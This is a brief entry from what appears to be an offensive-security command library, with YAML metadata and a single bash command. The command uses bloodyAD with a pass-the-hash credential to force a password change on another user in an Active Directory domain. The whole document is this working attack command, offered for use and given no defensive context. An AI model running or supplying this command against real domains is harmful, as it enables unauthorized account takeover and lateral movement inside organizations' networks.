---
id: 3036dbef-462f-47a8-ae15-d96fab0a9b06
name: Using bloodyAD with pass-the-hash
type: command
executor: bash
data: bloodyAD.py --host [DC IP] -d DOMAIN -u attacker_user -p :B4B9B02E6F09A9BD760F388B67351E2B
  changePassword target_user target_newpwd
output: null
created_at: '2023-04-06T03:56:07.010156+00:00'
updated_at: '2023-04-10T20:26:38.109512+00:00'
---

# Using bloodyAD with pass-the-hash

```bash
bloodyAD.py --host [DC IP] -d DOMAIN -u attacker_user -p :B4B9B02E6F09A9BD760F388B67351E2B changePassword target_user target_newpwd
```
